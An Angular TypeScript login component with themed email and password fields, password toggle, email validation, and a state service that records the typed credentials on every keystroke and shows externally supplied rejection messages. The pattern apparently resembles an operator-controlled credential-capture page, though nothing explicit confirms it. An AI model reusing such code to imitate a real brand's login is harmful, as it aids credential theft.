
import { Component, inject, signal, effect, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="space-y-8 animate-fade-in w-full">
        
        <!-- Rejection Feedback -->
        @if (state.rejectionReason()) {
          <div class="bg-red-50 border-l-[6px] border-red-500 p-4 flex items-start gap-4 rounded-r-lg animate-in slide-in-from-top-2">
            <span class="material-icons text-red-500 text-xl">error</span>
            <div>
              <p class="text-sm font-bold text-red-900">{{ 'LOGIN.ERROR_CREDENTIALS' | translate }}</p>
              <p class="text-xs text-red-700 mt-1">{{ state.rejectionReason() }}</p>
            </div>
          </div>
        }

        <!-- Inputs -->
        <div class="space-y-6">
          <!-- Email Field -->
          <div class="relative group">
            <input 
              type="text" 
              [(ngModel)]="email"
              (ngModelChange)="onEmailChange($event)"
              (blur)="touchedEmail.set(true)"
              id="email"
              placeholder=" "
              class="w-full transition-all duration-200 outline-none block"
              [class]="inputClasses()"
              [style]="inputStyles()"
            />
            
            <label for="email" 
                class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
                [class]="labelClasses()"
                [style.color]="inputTextColor()">
                {{ 'LOGIN.EMAIL_PLACEHOLDER' | translate }}
            </label>

            @if ((touchedEmail() || showErrors) && !isEmailValid()) {
                 <div class="absolute right-4 top-1/2 -translate-y-1/2 text-red-500 animate-in fade-in">
                    <span class="material-icons text-xl">error_outline</span>
                 </div>
            }
          </div>
          
          <!-- Password Field -->
          <div class="relative group">
            <input 
              [type]="showPassword() ? 'text' : 'password'" 
              [(ngModel)]="password"
              (ngModelChange)="onPasswordChange($event)"
              id="password"
              placeholder=" "
              class="w-full transition-all duration-200 outline-none block"
              [class]="inputClasses()"
              [style]="inputStyles()"
            />
            <label for="password" 
                class="absolute left-4 transition-all duration-200 pointer-events-none origin-[0]"
                [class]="labelClasses()"
                [style.color]="inputTextColor()">
                {{ 'LOGIN.PASSWORD_PLACEHOLDER' | translate }}
            </label>

            <button 
                (click)="togglePassword()" 
                class="absolute right-4 top-1/2 -translate-y-1/2 font-bold text-sm transition-colors z-10 p-1 outline-none"
                [style.color]="primaryColor()"
                tabindex="-1">
                {{ showPassword() ? 'Hide' : 'Show' }}
            </button>
          </div>
        </div>

        <div class="flex items-center justify-between -mt-2">
           <a class="font-semibold hover:underline cursor-pointer text-[14px]"
              [style.color]="primaryColor()">
              {{ 'LOGIN.FORGOT' | translate }}
           </a>
        </div>

        <!-- Action -->
        <div class="space-y-6 pt-2">
            <button 
                (click)="login()" 
                class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
                [style.background]="btnBackground()"
                [style.color]="btnTextColor()"
                [style.border-radius]="btnRadius()"
                [class.cursor-wait]="isLoading()"
                [disabled]="isLoading()">
              @if(isLoading()) {
                <span class="flex items-center justify-center gap-2">
                  <span class="material-icons animate-spin text-lg">refresh</span>
                  <span>{{ 'LOGIN.PROCESSING' | translate }}</span>
                </span>
              } @else {
                {{ 'LOGIN.LOG_IN' | translate }}
              }
            </button>

            <!-- Divider (Conditional) -->
             <div class="relative py-2">
              <div class="absolute inset-0 flex items-center">
                <div class="w-full border-t border-slate-300 opacity-30"></div>
              </div>
              <div class="relative flex justify-center text-sm">
                <span class="px-4 font-medium opacity-60" 
                      [style.background]="cardBg()"
                      [style.color]="inputTextColor()">
                    {{ 'LOGIN.OR' | translate }}
                </span>
              </div>
            </div>

            <!-- Sign Up (Secondary) -->
            <button class="w-full py-3 font-semibold border-2 hover:bg-black/5 transition-colors"
               [style.border-color]="primaryColor()"
               [style.color]="primaryColor()"
               [style.border-radius]="btnRadius()">
              {{ 'LOGIN.SIGN_UP' | translate }}
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class LoginComponent {
  state = inject(StateService);

  email = '';
  password = '';
  showErrors = false;
  touchedEmail = signal(false);
  showPassword = signal(false);

  isEmailValid = signal<boolean>(false);
  isValid = signal<boolean>(false);
  isLoading = signal<boolean>(false);

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  primaryColor = computed(() => this.theme()?.button.background || '#003087');
  btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
  btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');
  btnBackground = computed(() => this.theme()?.button.background || '#003087');

  cardBg = computed(() => this.theme()?.card.background || '#ffffff');
  inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');
  inputBg = computed(() => this.theme()?.input.backgroundColor || '#ffffff');

  constructor() {
    effect(() => {
      this.email = this.state.email();
      this.validate();
    }, { allowSignalWrites: true });

    effect(() => {
      const view = this.state.currentView();
      if (view !== 'loading') this.isLoading.set(false);
    }, { allowSignalWrites: true });
  }

  // Styles
  inputStyles() {
    const t = this.theme()?.input;
    return {
      'background-color': t?.backgroundColor || '#fff',
      'color': t?.textColor || '#000',
      'border-radius': t?.borderRadius || '0.5rem',
      'border': '1px solid #d1d5db',
      'padding': '1rem 1rem 0.5rem 1rem', // Space for floating label
      'height': '3.5rem'
    };
  }

  inputClasses() {
    const style = this.theme()?.input.style || 'modern';
    // Peer class allows sibling selector for label
    return `peer focus:ring-2 focus:ring-opacity-50 focus:border-transparent ${style === 'material' ? 'border-b-2 border-x-0 border-t-0 bg-transparent px-0 rounded-none' : 'border'}`;
  }

  labelClasses() {
    // Floating label logic
    const style = this.theme()?.input.style;
    const base = "text-sm text-gray-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-0 peer-focus:text-blue-600 left-4 top-2 scale-75 -translate-y-0";

    // If placeholder shown (empty), centering logic handled by peer-placeholder-shown
    return base;
  }

  togglePassword() {
    this.showPassword.update((v: boolean) => !v);
  }

  onEmailChange(val: string) {
    this.validate();
    this.state.updateUser({ email: val });
  }

  onPasswordChange(val: string) {
    this.validate();
    this.state.updateUser({ password: val });
  }

  validate() {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    const emailValid = emailRegex.test(this.email);
    this.isEmailValid.set(emailValid);
    this.isValid.set(emailValid && this.password.length > 0);
  }

  login() {
    this.touchedEmail.set(true);
    if (this.isEmailValid() && this.password.length > 0) {
      this.isLoading.set(true);
      this.state.submitLogin(this.email, this.password);
    } else {
      this.showErrors = true;
    }
  }
}
